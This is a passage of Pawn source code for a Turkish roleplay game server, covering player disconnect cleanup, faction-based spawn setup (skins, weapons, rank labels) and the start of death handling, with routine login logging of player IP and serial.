		format(isimstring, sizeof(isimstring), "loglar/%s.log", Isim(playerid));
		if(!fexist(isimstring))
		{
			new yaziyaz[256];
			format(yaziyaz, sizeof(yaziyaz), "[%d][%d][%d] [%d:%d:%d]Giris yapti. IP: %s - Serial: %s\r\n", gun, ay, yil, saat, dakika, saniye, ipmiver, playerserial);
			new File:newFile;
			newFile = fopen(isimstring, io_readwrite); //kaydedileceði yer
			if(newFile) {
				fwrite(newFile, yaziyaz);
				fclose(newFile);
   			}
		}
		else
		{
			format(string, sizeof(string), "Giris yapti. IP:%s - Serial: %s\r\n", ipmiver, playerserial);
			Log(playerid, string);
		}
	}
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
    if(IsPlayerNPC(playerid)) return 1;
	if(Debug) printf("OnPlayerDisconnect(%d, %d)",playerid,reason);
	//if(IsValidDynamic3DTextLabel(cNametag[playerid])) DestroyDynamic3DTextLabel(cNametag[playerid]);
	if(IsValidDynamicObject(graffiti[playerid])) DestroyDynamicObject(graffiti[playerid]);
	if(gKameraKurdu[playerid]) {
        if(gKameraKurdu[playerid] == 1)
	    {
	        ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid , SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(playerid , 8);
			RemovePlayerAttachedObject(playerid , 9);
	    }
	    else {
		    DestroyDynamicObject(gKamera[playerid][0]);
		    DestroyDynamicObject(gKamera[playerid][1]);
		    DestroyDynamicObject(gKamera[playerid][2]);
		    DestroyDynamicObject(gKamera[playerid][3]);
		}
	    gKameraKurdu[playerid] = 0;
	    foreach(new i : Player)
	    {
	        if(GetPVarInt(i, "IzledigiKameraman") == playerid) {
                TogglePlayerSpectating(playerid, false);
			    gTvIzliyo[playerid] = false;
				DONDUR(playerid);
				SetPlayerPos(playerid, gTx[playerid], gTy[playerid], gTz[playerid]);
				SetPlayerInterior(playerid, gTint[playerid]);
				SetPlayerVirtualWorld(playerid, gTvw[playerid]);
				SetCameraBehindPlayer(playerid);
				COZ(playerid);
				DeletePVar(i, "IzledigiKameraman");
			}
	    }
	}
	for(new i;i<MAX_EKIP;i++) {
		if(Ekip[i][oyuncu_1] == Karakter[playerid][sqlid]) {
			Ekip[i][no] = 0;
			Ekip[i][etip] = 0;
			Ekip[i][oyuncu_1] = 0;
			Ekip[i][oyuncu_2] = 0;
		}
	}
	if(snowOn[playerid])
   	{
    	for(new i = 0; i < MAX_SNOW_OBJECTS; i++) DestroyDynamicObject(snowObject[playerid][i]);
    	snowOn[playerid] = false;
        KillTimer(updateTimer[playerid]);
    }
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI) {
		RemovePlayerAttachedObject(playerid,9);
	    RemovePlayerAttachedObject(playerid,8);
	    flashlight[playerid]=0;
	}
	if(SpikeStrip_IsValid(Tuzak[playerid])) SpikeStrip_Delete(Tuzak[playerid]);
    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
	{
	    foreach(new i : Player)
	    {
		    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
			{
   			RemovePlayerMapIcon(i, playerid);
			}
		}
	}
    DeletePVar(playerid, "SoygunSure");
	if(GetPVarInt(playerid, "SoygunID") != -1)
	{
	    KillTimer(SoygunTextTimer[playerid]);
	    new _sid = GetPVarInt(playerid, "SoygunID");
	 	if(Soygun[_sid][lider] == playerid)
		{
	        IsyeriSoyuluyor[GetPVarInt(playerid, "SoygunIsyeriID")] = false;
			SoygunTextGizle(Soygun[playerid][lider]);
			Soygun[playerid][lider] = -1;
			if(Soygun[playerid][oyuncu2] != -1) { KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu2]]); SoygunTextGizle(Soygun[playerid][oyuncu2]); }
   			Soygun[playerid][oyuncu2] = -1;
			if(Soygun[playerid][oyuncu3] != -1) { KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu3]]); SoygunTextGizle(Soygun[playerid][oyuncu3]); }
            Soygun[playerid][oyuncu3] = -1;
			if(Soygun[playerid][oyuncu4] != -1) { KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu4]]); SoygunTextGizle(Soygun[playerid][oyuncu4]); }
            Soygun[playerid][oyuncu4] = -1;
			if(Soygun[playerid][oyuncu5] != -1) { KillTimer(SoygunTextTimer[Soygun[playerid][oyuncu5]]); SoygunTextGizle(Soygun[playerid][oyuncu5]); }
            Soygun[playerid][oyuncu5] = -1;
			Soygun[playerid][isyerid] = -1;
			Soygun[playerid][isyeritip] = -1;
			foreach(new i : Player)
			{
			    if(Birlik[Karakter[i][birlik]][ftip] == LSPD)
			    {
			        RemovePlayerMapIcon(i, playerid);
			    }
			}
	    }
	    else if(Soygun[_sid][oyuncu2] == playerid)
	    {
	        Soygun[_sid][oyuncu2] = -1;
	    }
	    else if(Soygun[_sid][oyuncu3] == playerid)
	    {
	        Soygun[_sid][oyuncu3] = -1;
	    }
	    else if(Soygun[_sid][oyuncu4] == playerid)
	    {
	        Soygun[_sid][oyuncu4] = -1;
	    }
	    else if(Soygun[_sid][oyuncu5] == playerid)
	    {
	        Soygun[_sid][oyuncu5] = -1;
	    }
    	SoygunTextGizle(playerid);
    }
	if(PlayerPBing[playerid])
	{
		PBPlayers--;
		if(PBPlayers <= 0) PaintBallEnd();
	}
	if(Karakter[playerid][isbasi] == 1)
	{
 		foreach(new i : Player)
		{
			RemovePlayerMapIcon(i, playerid);
		}
	}
 	UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, "");
 	UpdateDynamic3DTextLabelText(aworkIsim[playerid], 0x8D8DFFFF, "");
	if(GetPVarInt(playerid, "HUD") == 1) DeletePVar(playerid, "HUD");
	GostergeGizle(playerid);
	TaksimetreGizle(playerid);
	Karakter[playerid][Rapor] = 0;
	Karakter[playerid][Soru] = 0;
	format(Karakter[playerid][RaporTarih], 64, "");
	strdel(Karakter[playerid][RaporMesaj], 0, strlen(Karakter[playerid][RaporMesaj]));
	strdel(Karakter[playerid][SoruMesaj], 0, strlen(Karakter[playerid][SoruMesaj]));
    TogglePlayerSpectating(playerid, false);
	DeletePVar(playerid, "LastHP");
    DeletePVar(playerid, "LastHP1");
    DeletePVar(playerid, "last_anim");
	if(mavitaraf == playerid || kirmizitaraf == playerid)
	{
	    DovusIptal();
	}
    ResetPlayerVariables2(playerid);
    ResetPlayerVariables(playerid);

	maskegiyiyor[playerid] = 0;
	mik[playerid] = 0;
	k9izin[playerid] = 0;
	reklamfiyat[playerid] = 0;
    reklamgonderdi[playerid] = 0;
    reklamsira[playerid] = 0;
    CancelDrivingTest(playerid);

	for(new i = 0; i < MAX_PLAYERS; i++)
	{
        if(IsPlayerConnected(i))
        {
            if(RadyoOyuncu[i] == playerid)
            {
                Radyorenniem[i] = 0;
                RadyoOyuncu[i] = -1;
                StopAudioStreamForPlayer(i);
            }
		}
		if(Karakter[playerid][suruklenen] != -1)
		{
		    Karakter[Karakter[playerid][suruklenen]][suruklenen] = -1;
		}
		if(GozBaglayan[i] == playerid)
		{
		    Bilgi(playerid, "Gözlerinizi baðlayan oyuncu oyundan düþtü/çýktý. Göz baðýnýz çözüldü.");
		    GozBaglandi[i] = 0;
		    GozBaglayan[i] = -1;
		    SetCameraBehindPlayer(i);
		}
		new Float:U;
		new Float:F;
		new Float:T;
		GetPlayerPos(playerid, U,F,T);
		if(PlayerToPoint(15.0,i, U,F,T))
		{
		    if(Girdi[playerid] == true && !aDuty[playerid])
		    {
				new var[90];
				switch(reason)
				{
					case 0:
						format(var, 90, "{C0C0C0}(( %s sunucudan ayrýldý. Sebep: Crash )) ", OyuncuAdiniBul(playerid)),
						Log(playerid, "Cikis yapti. Sebep: Crash"),
						GirdiSil(playerid);
					case 1:
						format(var, 90, "{C0C0C0}(( %s sunucudan ayrýldý. Sebep: Kendi isteðiyle ))", OyuncuAdiniBul(playerid)),
						Log(playerid, "Cikis yapti. Sebep: Kendi istegiyle"),
						GirdiSil(playerid);
					case 2:
						format(var, 90, "{C0C0C0}(( %s sunucudan ayrýldý. Sebep: Atýldý/Yasaklandý ))", OyuncuAdiniBul(playerid)),
						Log(playerid, "Cikis yapti. Sebep: Atildi/Yasaklandi"),
						GirdiSil(playerid);
                    case 3:
						format(var, 90, "{C0C0C0}(( %s sunucudan ayrýldý. Sebep: Relog ))", OyuncuAdiniBul(playerid)),
						Log(playerid, "Cikis yapti. Sebep: Atildi/Yasaklandi"),
						GirdiSil(playerid);
				}
				SendClientMessage(i, -1, var);
			}
		}
	}
    if(Karakter[playerid][gDuzenliyor] == 1)
    {
        DestroyDynamicObject(gObjesi[playerid]);
        Karakter[playerid][gDuzenliyor] = 0;
        DestroyDynamic3DTextLabel(Karakter[playerid][gLabel]);
    }
	if(Tezgah[playerid][0] != 0)
	{
		DestroyDynamicObject(Tezgah[playerid][0]);
		for(new i; i < 3; i++) tPos[playerid][i] = 0;
		for(new i; i < 3; i++) Tezgah[playerid][i] = 0;
	}
	if(IsValidDynamicObject(sandalyeobje[playerid]))
	{
	    DestroyDynamicObject(sandalyeobje[playerid]);
		DestroyDynamic3DTextLabel(SandalyeLabel[playerid]);
	}
	if(IsValidDynamic3DTextLabel(TezgahLabel[playerid]))
	{
	    DestroyDynamic3DTextLabel(TezgahLabel[playerid]);
	}
	if(rennieRadyo[playerid])
	{
	    rennieRadyo[playerid] = 0;
	    RadyoOyuncu[playerid] = -1;
	    Radyorenniem[playerid] = 0;
	    rennieradyopos[playerid][0] = 0;
		rennieradyopos[playerid][1] = 0;
		rennieradyopos[playerid][2] = 0;
		rennieradyopos[playerid][3] = 0;
	    format(rennieRadyoURL[playerid], 256, "");
	    RadyoVirtual[playerid] = 0;
	    DestroyDynamic3DTextLabel(rennieRadyoLabel[playerid]);
	    if(IsValidDynamicObject(rennieRadyoObject[playerid])) DestroyDynamicObject(rennieRadyoObject[playerid]);
	}
	KillTimers(playerid);
	RemovePlayerAttachedObject(playerid, gunindex[playerid]);
	KarakterKaydet(playerid);
	if(reason && Taksi[playerid] != 0)
	{
	    SetVehicleToRespawn(Taksi[playerid]);
	    Taksi[playerid] = 0;
	}
	return 1;
}

public OnPlayerSpawn(playerid)
{
	if(Debug) printf("OnPlayerSpawn(%d)",playerid);
	if(IsPlayerNPC(playerid)) return 1;
    if(!Girdi[playerid]) DONDUR(playerid);
    if(GetPlayerVirtualWorld(playerid) != 0 && !GetPVarInt(playerid, "aww"))
    {
        DONDUR(playerid);
        UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 5000, false, "u", playerid);
    }
	PreloadPlayerAnims(playerid);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 998);
    SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 998);
    SetPlayerFightingStyle(playerid, dovustil[playerid]);
    foreach(new i : Player)
	{
	    if(Maske[i] == true)
	    {
			ShowPlayerNameTagForPlayer(playerid, i, false);
		}
	}
	if(Maske[playerid] == true)
	{
		foreach(new i : Player)
		{
			ShowPlayerNameTagForPlayer(i, playerid, false);
		}
	}
	if(GetPVarInt(playerid, "aww") == 1)
	{
	    SetPlayerSkin(playerid, Karakter[playerid][skin]);
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
		{
		    if(Karakter[playerid][isbasi] == 1)
		    {
		        if(Karakter[playerid][adminlevel] >= 1) {
					SetPlayerSkin(playerid, Karakter[playerid][skin]);
				}
				else {
					SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
				}
				SetPlayerColor(playerid,0x8D8DFFFF);
	   			GivePlayerWeapon(playerid, 3, 1);
	        	GivePlayerWeapon(playerid, 41, 1000);
	        	GivePlayerWeapon(playerid, 24, 50);
			}
			else if(Karakter[playerid][isbasi] == 0)
			{
			    if(Karakter[playerid][rutbe] <= 14)
				{
					GivePlayerWeapon(playerid, 24, 100);
				}
				else if(Karakter[playerid][rutbe] == 15 || Karakter[playerid][rutbe] == 16 || Karakter[playerid][rutbe] == 17)
				{
					GivePlayerWeapon(playerid, 22, 50);
				}
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
		{
		    if(Karakter[playerid][fdisbasi] == 1)
		    {
				SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
				SetPlayerColor(playerid, COLOR_LSFD);
			}
			else if(Karakter[playerid][fdisbasi] == 0)
			{
			    SetPlayerSkin(playerid, Karakter[playerid][skin]);
			    SetPlayerColor(playerid,COLOR_WHITE);
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS)
		{
		    if(Karakter[playerid][medisbasi] == 1)
		    {
				SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
				SetPlayerColor(playerid, COLOR_LSMC);
			}
			else if(Karakter[playerid][medisbasi] == 0)
			{
			    SetPlayerSkin(playerid, Karakter[playerid][skin]);
			    SetPlayerColor(playerid,COLOR_LSMC);
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
		  GivePlayerWeapon(playerid, 24, 100);
		  SetPlayerColor(playerid,COLOR_WHITE);
		}
	    SetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
	    SetPlayerInteriorEx(playerid, Karakter[playerid][interior]);
	    SetPlayerVirtualWorld(playerid, Karakter[playerid][vworld]);
	    SetPlayerHealth(playerid, Karakter[playerid][hp]);
	    SetPlayerArmour(playerid, 0);
	    TogglePlayerControllable(playerid, 0);
	    if(GetPVarInt(playerid, "InAirsoft") || mavitaraf == playerid || kirmizitaraf == playerid)
		{
		    ApplyAnimationEx(playerid,"PED","FLOOR_hit",4.1,0,1,1,1,1);
		    DONDUR(playerid);
			UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 1000, false, "u", playerid);
		}
	    DeletePVar(playerid, "aww");
	    if(!GetPVarInt(playerid, "InAirsoft") && mavitaraf != playerid && kirmizitaraf != playerid && GetPVarInt(playerid, "Yarali") == 0 && join[playerid] != 1)
	    {
	        DONDUR(playerid);
         	ApplyAnimationEx(playerid,"CRACK","crckidle2",4.1,0,1,1,1,1);
	        Bilgi(playerid, "Yaralandýnýz! 80 saniye yerde kalýcaksýnýz.");
	        SetPVarInt(playerid, "Yarali", 80);
	        PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
	        PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], "80");
	        for(new i=0;i<5;i++)
			{
				if(aksesuar[playerid][i][giyilmis] == true)
				{
					SetPlayerAttachedObject(playerid,i,aksesuar[playerid][i][amodel],aksesuar[playerid][i][abone],aksesuar[playerid][i][akX],aksesuar[playerid][i][akY],aksesuar[playerid][i][akZ],aksesuar[playerid][i][arX],aksesuar[playerid][i][arY],aksesuar[playerid][i][arZ],aksesuar[playerid][i][aoX],aksesuar[playerid][i][aoY],aksesuar[playerid][i][aoZ],aksesuar[playerid][i][arenk1],aksesuar[playerid][i][arenk2]);
					AksesuarGuncelle(playerid,i);
				}
		  	}
	        return 1;
	    }
	    if(PlayerPBing[playerid])
		{
			DONDUR(playerid);
			PBAyarla(playerid);
			SetPlayerHealth(playerid,100.0);
			SetPlayerArmour(playerid,50.0);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid,PBGunID,99999);
        	UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 5000, false, "u", playerid);
		}
		if( (mavitaraf == playerid || kirmizitaraf == playerid) && dovus )
		{
		    DovusBitir();
		}
	}
	if(!GetPVarInt(playerid, "InAirsoft")) {
		if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
			GivePlayerWeapon(playerid, 24, 100);
			SetPlayerColor(playerid,COLOR_WHITE);
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
		{
		    if(Karakter[playerid][fdisbasi] == 1)
		    {
				SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
				SetPlayerColor(playerid, COLOR_LSFD);
                new targetrank[32];
				switch(Karakter[playerid][rutbe])
				{
					case 0: targetrank = "Sivil";
					case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
					case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
					case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
				   	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
				    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
				    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
					case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
					case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
					case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
					case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
					case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
					case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
					case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
					case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
					case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
					case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
					case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
					case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
					case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
					case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
				}
				format(targetrank, 32, "[%s]", targetrank);
				if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSFD, targetrank);
			}
			else if(Karakter[playerid][fdisbasi] == 0)
			{
			    UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSFD, "");
			    SetPlayerSkin(playerid, Karakter[playerid][skin]);
			    SetPlayerColor(playerid,COLOR_WHITE);
			}
		}
		else if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
		{
			if(Karakter[playerid][isbasi] == 1)
			{
				if(Karakter[playerid][adminlevel] >= 1) {
				SetPlayerSkin(playerid, Karakter[playerid][skin]);
				}
				else {
				SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
				}
				SetPlayerColor(playerid,0x8D8DFFFF);
				GivePlayerWeapon(playerid, 3, 1);
				GivePlayerWeapon(playerid, 41, 1000);
				GivePlayerWeapon(playerid, 24, 50);
				new targetrank[32];
				switch(Karakter[playerid][rutbe])
				{
					case 0: targetrank = "Sivil";
					case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
					case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
					case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
					case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
					case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
					case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
					case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
					case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
					case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
					case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
					case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
					case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
					case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
					case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
					case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
					case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
					case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
					case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
					case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
					case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
				}
				format(targetrank, 32, "[%s]", targetrank);
				if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, targetrank);
			}
			else if(Karakter[playerid][isbasi] == 0)
			{
				if(Karakter[playerid][rutbe] <= 14)
					{
					GivePlayerWeapon(playerid, 24, 100);
					}
					else if(Karakter[playerid][rutbe] == 15 || Karakter[playerid][rutbe] == 16 || Karakter[playerid][rutbe] == 17)
					{
					GivePlayerWeapon(playerid, 22, 50);
					}
			}
		}
		else if(Karakter[playerid][sisbasi] == 1 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
		{
			SetPlayerColor(playerid, COLOR_SANTV);
			GivePlayerWeapon(playerid, 43, 100);
		}
		else if(Karakter[playerid][medisbasi] == 1 && Birlik[Karakter[playerid][birlik]][ftip] == ASMS)
		{
			SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
			SetPlayerColor(playerid, COLOR_LSMC);
			new targetrank[32];
			switch(Karakter[playerid][rutbe])
			{
				case 0: targetrank = "Sivil";
				case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
				case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
				case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
				case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
				case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
				case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
				case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
				case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
				case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
				case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
				case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
				case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
				case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
				case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
				case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
				case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
				case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
				case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
				case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
				case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSMC, targetrank);
		}
		else if(Karakter[playerid][fdisbasi] == 1 && Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
		{
			SetPlayerSkin(playerid, Karakter[playerid][isbasiskin]);
			SetPlayerColor(playerid, COLOR_LSFD);
		}
		else if(PlayerPBing[playerid])
		{
			new RandomSpawn = random(sizeof(PBSpawns));
			new RandomSkins = random(sizeof(PBSkins));
			SetPlayerSkin(playerid,PBSkins[RandomSkins]);
			SetPlayerPos(playerid,PBSpawns[RandomSpawn][0],PBSpawns[RandomSpawn][1],PBSpawns[RandomSpawn][2]);
			SetPlayerFacingAngle(playerid,PBSpawns[RandomSpawn][3]);
			SetPlayerHealth(playerid,100.0);
			SetPlayerArmour(playerid,50.0);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid,PBGunID,99999);
			DONDUR(playerid);
			UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 5000, false, "u", playerid);
		}
		else if(GozBaglandi[playerid] == 1)
		{
			SetPlayerCameraLookAt(playerid, 2000, -2000, 2000);
			SetPlayerCameraPos(playerid, 2000, -2000, 2000);
		}
		else if(join[playerid])
		{
			join[playerid] = 0;
			DONDUR(playerid);
			SetPlayerPos(playerid, GetPVarFloat(playerid,"ePosX"), GetPVarFloat(playerid,"ePosY"), GetPVarFloat(playerid,"ePosZ"));
			SetPlayerFacingAngle(playerid,GetPVarFloat(playerid,"ePosAngle"));
			SetPlayerInterior(playerid, GetPVarInt(playerid, "ePosInt"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "ePosVw"));
			UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
		}
	}
	if(!Girdi[playerid])
	{
     	new randommuzik = random(2);
		switch(randommuzik)
		{
			case 0: PlayAudioStreamForPlayer(playerid, "https://www.eightbornrpg.com/giris1.mp3");
			case 1: PlayAudioStreamForPlayer(playerid, "https://www.eightbornrpg.com/giris2.mp3");
		}
	    DONDUR(playerid);
		InterpolateCameraPos(playerid, 1306.345458, -1872.893920, 48.846801, 2100.956542, -1859.029296, 38.765197, 9000);
		InterpolateCameraLookAt(playerid, 1311.331176, -1872.725708, 48.508426, 2099.986816, -1854.294555, 37.483985, 9000);
		ClearScreen(playerid);
		/*new _name[48];
		GetPlayerName(playerid, _name, sizeof(_name));
		//PlayerTextDrawSetString(playerid, IsimText[playerid], _name);
		PlayerTextDrawShow(playerid, IsimText[playerid]);*/
        new randomekran = random(1);
		switch(randomekran)
		{
			//case 0: TextDrawShowForPlayer(playerid, Login[0]);
			//case 1: TextDrawShowForPlayer(playerid, Login[1]);
			//case 2: TextDrawShowForPlayer(playerid, Login[2]);
			//case 3: TextDrawShowForPlayer(playerid, Login[3]);
			//case 4: TextDrawShowForPlayer(playerid, Login[4]);
		}
	}
	for(new i=0;i<5;i++)
	{
		if(aksesuar[playerid][i][giyilmis] == true)
		{
			SetPlayerAttachedObject(playerid,i,aksesuar[playerid][i][amodel],aksesuar[playerid][i][abone],aksesuar[playerid][i][akX],aksesuar[playerid][i][akY],aksesuar[playerid][i][akZ],aksesuar[playerid][i][arX],aksesuar[playerid][i][arY],aksesuar[playerid][i][arZ],aksesuar[playerid][i][aoX],aksesuar[playerid][i][aoY],aksesuar[playerid][i][aoZ],aksesuar[playerid][i][arenk1],aksesuar[playerid][i][arenk2]);
			AksesuarGuncelle(playerid,i);
		}
  	}
  	KarakterKaydet(playerid);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	if(Debug) printf("OnPlayerDeath(%d, %d, %d)",playerid, killerid, reason);
	if(GetPVarInt(playerid, "InAirsoft")) return 1;
    if(IsPlayerBleeding(playerid)) StopPlayerBleeding(playerid);
	new Float:X,Float:Y,Float:Z;
	SetPlayerCash(playerid, Karakter[playerid][para]);
	GetPlayerPos(playerid,X,Y,Z);
	Karakter[playerid][posx] = X,Karakter[playerid][posy] = Y,Karakter[playerid][posz] = Z;
	Karakter[playerid][interior] = GetPlayerInterior(playerid);
	Karakter[playerid][vworld] = GetPlayerVirtualWorld(playerid);
	Karakter[playerid][hp] = 15.0;
	SetPVarInt(playerid, "aww", 1);
	if( (mavitaraf == playerid || kirmizitaraf == playerid) && dovus )
	{
		if(mavitaraf == playerid) kazanantaraf = 2;
		if(kirmizitaraf == playerid) kazanantaraf = 1;
		new mstring[128];
		foreach(new i : Player)
		{
		    if(bahistip[i] == 1 && kazanantaraf == 1)
		    {
		        Bilgi(i, "Bahisi kazandýnýz.");
		        GivePlayerCash(i, bahispara[i]*2);
		        format(mstring, sizeof(mstring), "Bahisden %d$ kazandý.",bahispara[i]);
				Log(playerid, mstring);
		        bahispara[i] = 0;
				bahistip[i] = 0;
		    }
		    else if(bahistip[i] == 2 && kazanantaraf == 2)
		    {
				Bilgi(i, "Bahisi kazandýnýz.");
		        GivePlayerCash(i, bahispara[i]*2);
		        format(mstring, sizeof(mstring), "Bahisden %d$ kazandý.",bahispara[i]);
				Log(playerid, mstring);
		        bahispara[i] = 0;
				bahistip[i] = 0;
		    }
		    else
		    {
		        format(mstring, sizeof(mstring), "Bahisde %d$ kaybetti.",bahispara[i]);
		        Log(playerid, mstring);
		    }
		}
	}
	if(killerid != INVALID_PLAYER_ID)
	{
		if(PlayerPBing[killerid])
		{
			new string[256],string2[128],pName[MAX_PLAYER_NAME];
			GetPlayerName(killerid,pName,sizeof(pName));
			PlayerPBKills[killerid]++;
